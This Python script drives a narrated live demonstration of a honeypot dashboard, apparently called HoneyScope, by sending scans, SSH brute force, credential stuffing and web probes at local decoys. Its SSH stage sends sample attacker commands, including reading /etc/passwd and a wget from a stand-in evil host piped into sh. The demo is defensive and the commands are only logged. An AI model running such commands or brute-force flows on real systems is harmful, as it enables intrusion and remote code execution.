#!/usr/bin/env python3
"""HoneyScope live demonstration - narrated, real attack scenarios.

Run this WHILE the dashboard is open to walk an audience through genuine
attack behaviour. Every scenario sends REAL network traffic that the decoys
REALLY capture - nothing is fabricated. Each scenario is sourced from a
distinct real local address (interface IPs / loopback aliases) so the
dashboard shows several distinct attacker identities.

Usage:
    python scripts/live_demo.py              # interactive (press Enter)
    python scripts/live_demo.py --auto       # non-interactive (for testing)

Optional advanced stage (SSH command capture) runs automatically only if the
SSH decoy is in shell mode (services.ssh.accept_any_credentials = true).
"""

from __future__ import annotations

import argparse
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "scripts"))

import simulate_attacks as sa  # noqa: E402

C = "\033[96m"   # cyan
G = "\033[92m"   # green
Y = "\033[93m"   # yellow
B = "\033[1m"    # bold
N = "\033[0m"    # reset

SCENARIO_NAMES = ["port-scan", "ssh-bruteforce", "stuffing",
                  "web-attacks", "ftp-telnet", "ssh-shell"]


def rule(char: str = "═") -> None:
    print(B + C + char * 64 + N)


def narrate(text: str) -> None:
    for line in text.strip().splitlines():
        print(C + "│ " + N + line)


def pause(auto: bool, prompt: str = "Press Enter to continue…") -> None:
    if auto:
        time.sleep(0.4)
        return
    try:
        input("\n" + Y + B + prompt + N)
    except (EOFError, KeyboardInterrupt):
        sys.exit(0)


def stage_header(num: int, title: str) -> None:
    print()
    rule()
    print(B + f"  SCENARIO {num}: {title}" + N)
    rule()


def ssh_shell_enabled(host: str, port: int) -> bool:
    """Probe whether the SSH decoy currently accepts credentials."""
    try:
        import paramiko
    except ImportError:
        return False
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=host, port=port, username="__probe__",
                       password="__probe__", allow_agent=False,
                       look_for_keys=False, timeout=4, banner_timeout=6)
        client.close()
        return True
    except Exception:
        return False


def stage_ssh_shell(host: str, port: int, delay: float, src: str) -> None:
    """Real interactive SSH session; commands are captured by the decoy."""
    import paramiko
    print(f"[*] Attacker opens an interactive SSH session (from {src})...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname=host, port=port, username="root",
                   password="password123", allow_agent=False,
                   look_for_keys=False, timeout=6,
                   sock=sa._connect(host, port, src, timeout=6))
    chan = client.invoke_shell()
    time.sleep(0.5)
    chan.recv(4096)
    for cmd in ("whoami", "uname -a", "cat /etc/passwd | grep root",
                "wget http://evil.example/x.sh -qO- | sh",
                "netstat -tlnp", "exit"):
        print(f"    attacker$ {cmd}")
        chan.send(cmd + "\n")
        time.sleep(0.5 + delay)
    chan.close()
    client.close()


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--ssh-port", type=int, default=2222)
    ap.add_argument("--http-port", type=int, default=8081)
    ap.add_argument("--ftp-port", type=int, default=2121)
    ap.add_argument("--telnet-port", type=int, default=2323)
    ap.add_argument("--auto", action="store_true",
                    help="run non-interactively (no Enter prompts)")
    ap.add_argument("--delay", type=float, default=0.15)
    ap.add_argument("--i-own-this-network", action="store_true")
    args = ap.parse_args()

    sa.guard_target(args.host, args.i_own_this_network)
    sensors = [1433, 3306, 3389, 5432, 5900, 6379, 8000, 8443, 9000, 9200, 27017]

    # Distinct REAL source identities, discovered from local interfaces.
    sources = sa.discover_sources()
    personas = {name: sources[i % len(sources)]
                for i, name in enumerate(SCENARIO_NAMES)}

    print()
    rule("━")
    print(B + G + "   HoneyScope — LIVE ATTACK DEMONSTRATION" + N)
    rule("━")
    narrate("""
    This demo drives REAL attacks against the local honeypot decoys.
    Every event you will see on the dashboard is genuinely captured
    network traffic - there is no pre-loaded or fabricated data.

    Before you begin:
      1. Make sure the dashboard is open:  http://127.0.0.1:5555
      2. Open the Overview page and watch it update every 5 seconds.
      3. Keep a second tab open on the Events page.
""")
    if len(sources) > 1:
        narrate(f"""
    Attacker identities for this run (real local addresses):
      {', '.join(sources)}
    (on Linux/Docker more loopback aliases appear automatically;
     macOS exposes the LAN IP - enable extras with:
     sudo ifconfig lo0 alias 127.0.0.2 up)
""")
    else:
        narrate("""
    Only one source address (127.0.0.1) is available on this machine.
    To show several distinct attackers, run the demo from a second device
    or inside Docker, where loopback aliases (127.0.0.2 ...) are available.
""")
    pause(args.auto, "Press Enter to START the demo…")

    # --------------------------------------------------------- 1. port scan
    stage_header(1, "Reconnaissance — Port Scan")
    narrate(f"""
    ATTACKER ACTION: an automated scanner ({personas['port-scan']}) sweeps
    {len(sensors)} common service ports looking for anything exposed.

    HONEYPOT RESPONSE: every probe is a real TCP connection recorded as a
    'port_probe'. After 5+ distinct ports from one IP, the threat engine
    auto-labels it 'port_scan' (HIGH severity).
""")
    pause(args.auto, "Press Enter to run the port scan…")
    sa.scenario_port_scan(args.host, sensors, args.delay, personas["port-scan"])
    narrate("""
    CHECK THE DASHBOARD → Events: service filter 'sensor' shows the probes
    streaming in; the Attack Patterns chart now includes 'port_scan'.
""")
    pause(args.auto)

    # ---------------------------------------------------- 2. ssh brute force
    stage_header(2, "SSH Brute-Force Attack")
    narrate(f"""
    ATTACKER ACTION: host {personas['ssh-bruteforce']} repeatedly attempts to
    log in over SSH (:2222) with common credentials (root/toor, admin/admin,
    pi/raspberry ...).

    HONEYPOT RESPONSE: a full SSH handshake happens for each attempt and the
    credentials are captured. The 5th consecutive failure trips the
    'brute_force' rule; more attempts push severity toward CRITICAL.
""")
    pause(args.auto, "Press Enter to run the SSH brute-force…")
    sa.scenario_ssh(args.host, args.ssh_port, args.delay,
                    personas["ssh-bruteforce"])
    narrate("""
    CHECK THE DASHBOARD → Events: filter severity = HIGH / CRITICAL.
    Click a row to see the exact username + password the attacker tried.
""")
    pause(args.auto)

    # ------------------------------------------------- 3. credential stuffing
    stage_header(3, "Credential Stuffing (Web Login)")
    narrate(f"""
    ATTACKER ACTION: host {personas['stuffing']} reuses leaked
    username/password pairs against the decoy router login page at
    http://{args.host}:{args.http_port}/login.

    HONEYPOT RESPONSE: the fake login form captures each pair. When 6+
    distinct usernames arrive, the engine labels it 'credential_stuffing'
    (CRITICAL).
""")
    pause(args.auto, "Press Enter to run credential stuffing…")
    sa.scenario_stuffing(args.host, args.http_port, args.delay,
                         personas["stuffing"])
    narrate("""
    CHECK THE DASHBOARD → Credentials page: the username/password chart and
    combination table are now populated with the attacker's list.
""")
    pause(args.auto)

    # ------------------------------------------------------- 4. web attacks
    stage_header(4, "Web Application Attacks")
    narrate(f"""
    ATTACKER ACTION: host {personas['web-attacks']} sends SQL-injection, XSS,
    path-traversal and webshell probes (with a sqlmap signature) against the
    web decoy.

    HONEYPOT RESPONSE: payloads are parsed by the signature engine and tagged
    sql_injection / xss / path_traversal / webshell_probing.
""")
    pause(args.auto, "Press Enter to run the web attacks…")
    sa.scenario_web(args.host, args.http_port, args.delay,
                    personas["web-attacks"])
    narrate("""
    CHECK THE DASHBOARD → Events: open a row and read the raw payload in the
    detail modal (e.g. \"1' OR '1'='1 UNION SELECT...\").
""")
    pause(args.auto)

    # ------------------------------------------------------- 5. ftp / telnet
    stage_header(5, "Legacy Protocol Attacks (FTP + Telnet)")
    narrate(f"""
    ATTACKER ACTION: host {personas['ftp-telnet']} tries default/anonymous
    logins over FTP (:2121) and Telnet (:2323).

    HONEYPOT RESPONSE: the protocol decoys hold a realistic conversation and
    record every USER/PASS exchange.
""")
    pause(args.auto, "Press Enter to run FTP + Telnet attacks…")
    sa.scenario_ftp(args.host, args.ftp_port, args.delay, personas["ftp-telnet"])
    sa.scenario_telnet(args.host, args.telnet_port, args.delay,
                       personas["ftp-telnet"])
    narrate("""
    CHECK THE DASHBOARD → Events: two new ftp/telnet login_attempt events
    with the attempted credentials.
""")
    pause(args.auto)

    # ----------------------------------------- 6. optional interactive shell
    if ssh_shell_enabled(args.host, args.ssh_port):
        stage_header(6, "Interactive Session — Command Capture")
        narrate(f"""
    ATTACKER ACTION: after a successful (decoy) login from
    {personas['ssh-shell']}, runs reconnaissance commands:
    whoami, uname -a, cat /etc/passwd, wget | sh ...

    HONEYPOT RESPONSE: the sandboxed fake shell logs every command as a
    'command' event. NOTHING is actually executed.
""")
        pause(args.auto, "Press Enter to run the interactive session…")
        stage_ssh_shell(args.host, args.ssh_port, args.delay,
                        personas["ssh-shell"])
        narrate("""
    CHECK THE DASHBOARD → Events: filter type 'command' to see exactly what
    the attacker typed.
""")
        pause(args.auto)
    else:
        stage_header(6, "Interactive Session — Command Capture (SKIPPED)")
        narrate("""
    This stage is disabled. To demonstrate it, set
    services.ssh.accept_any_credentials = true in config.json and restart,
    then re-run this demo. The decoy will accept logins and log every command
    an attacker types (without executing anything).
""")
        pause(args.auto)

    # ------------------------------------------------------------ summary
    print()
    rule("━")
    print(B + G + "   DEMO COMPLETE" + N)
    rule("━")
    narrate(f"""
    Everything the audience watched was REAL attack traffic captured live
    from these source identities: {', '.join(sources)}.

    FINISHING STEPS (do these on screen):
      1. Overview  → point out KPI cards + timeline + severity chart.
      2. Events    → filter severity = CRITICAL; open a few detail modals.
      3. Intel     → show the distinct attacker IPs.
      4. Report    → "Generate report now" and open the self-contained HTML
                     report with real findings + defensive recommendations.

    To run a fresh demo later:  python run.py --mode reset-db
                                (or the "Clear all events" button on Events).
""")
    return 0


if __name__ == "__main__":
    sys.exit(main())
